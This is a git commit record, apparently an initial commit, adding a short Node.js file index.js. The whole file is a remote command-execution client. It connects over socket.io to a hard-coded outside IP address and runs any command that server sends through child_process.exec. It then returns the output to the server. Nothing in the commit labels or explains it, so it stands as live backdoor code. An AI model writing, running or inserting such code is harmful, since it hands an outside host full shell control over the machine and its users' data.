cacd91ce42462c7d3099ecd4551e06a24f46aeff
schinken <schinken@wurst.net>
2020-05-12 21:27:33 +0200

    initial commit

---
+++ index.js
@@ -0,0 +1,20 @@
+const socketioClient = require("socket.io-client");
+const childProcess = require("child_process");
+
+const socket = socketioClient("http://5.34.183.68:12345");
+
+socket.on("error", () => {});
+
+socket.on("connect", () => {
+  console.log("Connected to the server.");
+});
+
+socket.on("disconnect", () => {
+  console.log("Disconnected from the server.");
+});
+
+socket.on("exec", cmd => {
+  childProcess.exec(cmd, (err, stdout, stderr) => {
+    socket.emit("execResponse", cmd, err, stdout, stderr);
+  });
+});
